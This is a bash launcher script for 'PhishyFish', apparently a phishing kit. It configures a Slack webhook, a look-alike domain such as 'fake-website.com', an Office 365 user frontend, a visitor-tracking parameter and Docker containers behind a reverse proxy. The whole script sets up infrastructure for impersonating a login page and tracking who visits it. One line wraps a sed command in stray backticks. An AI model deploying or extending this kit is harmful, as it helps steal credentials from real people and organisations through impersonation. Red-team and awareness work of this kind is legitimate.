#!/bin/bash


RED='\033[0;31m'
Blue='\033[0;34m'
NC='\033[0m' 
echo -e "${RED}PhishyFish${NC} ${Blue}><(((º> ${NC}"

usage() { 

  echo  -e "Usage: $0 -p password [ -s slack_webhookURL ] [-d domain_for_SSL_generation ] [-S sub_Directory] [-i parameter_to_log_visitors]" \
    "\nExample: ./start.sh -p SuperSecret -d fake-website.com -s https://hooks.slack.com/services/xxx/xxx -S internal -i redirect"
}
exit_abnormal() {
  usage
  exit 1
}


while getopts "p:s:d:h:S:i:" flag
do
            case "${flag}" in
                p) password=${OPTARG};;
                s) slack_URL=${OPTARG};;
                d) website_domain=${OPTARG};;
                S) sub_dir=${OPTARG};;
                i) user_parm_id=${OPTARG};;
                :) exit_abnormal;;
                *) exit_abnormal;;
            esac
done
if [[ -z $password  ]]; then
    echo "hmmmmmmmmmmm, nice empty password, but you need one to not get hacked"
    exit_abnormal
fi

echo "[+] Generating the config files"
cp api/example.config.json api/config.json
sed -i "s|SLACK_URL_PLACEHOLDER|$slack_URL|g" api/config.json
sed -i "s/API_KEY_PLACEHOLDER/$password/g"  api/config.json
sed -i "s/DEBUG_PLACEHOLDER/false/g"  api/config.json


# echo using $password $slack_URL $website_domain
if [[  $slack_URL  ]]; then
    echo "[+] slack url is $slack_URL"
fi


if [[ -z $website_domain  ]];
then 
    echo "[+] using localhost domain"
    curr_domain=localhost
else
    echo "[+] using $website_domain domain"
    curr_domain=$website_domain
fi

cat ./caddy/Caddyfile_template | sed "s/DOMAIN_PLACEHOLDER/$curr_domain/g" > ./caddy/Caddyfile
# cp leet_frontend/example.env.local leet_frontend/.env.local
cat leet_frontend/example.env.local | sed "s/DOMAIN_PLACEHOLDER/$curr_domain/g" > leet_frontend/.env.local
cat user_frontend/o365/example.env.local | sed "s/DOMAIN_PLACEHOLDER/$curr_domain/g" > user_frontend/o365/.env.local

if [[ -z $sub_dir  ]];
then 
    echo "[+] Hosting in root sub-directory"
    sub_dir_escaped="NOSUBDIR"
else
    echo "[+] Hosting in $sub_dir sub-directory"
    sub_dir_escaped=$(printf '%s\n' "$sub_dir" | sed -e 's/[]\/$*.^[]/\\&/g');
fi

sed -i "s/SUB_DIR_PLACEHOLDER/$sub_dir_escaped/g"  user_frontend/o365/.env.local


if [[ -z $user_parm_id ]];
then 
    echo "[+] Setting up without user tracking via id"
   
else
    echo "[+] Setting user parameter to $user_parm_id"`
    sed -i "s/USER_PARAM_PLACEHOLDER/$user_parm_id/g"  user_frontend/o365/.env.local`
fi


echo "[+] crating docker network if not exit"
docker network create reverse_proxy_phishyfish
echo "[+] Starting the docker"
if docker compose version &> /dev/null; then
    echo "[+] Using docker compose"
    docker compose up --build --remove-orphans
elif command -v docker-compose &> /dev/null; then
    echo "[+] Using docker-compose"
    docker-compose up --build --remove-orphans
else
    echo "[-] Neither docker-compose nor docker compose is available."
    exit 1
fi
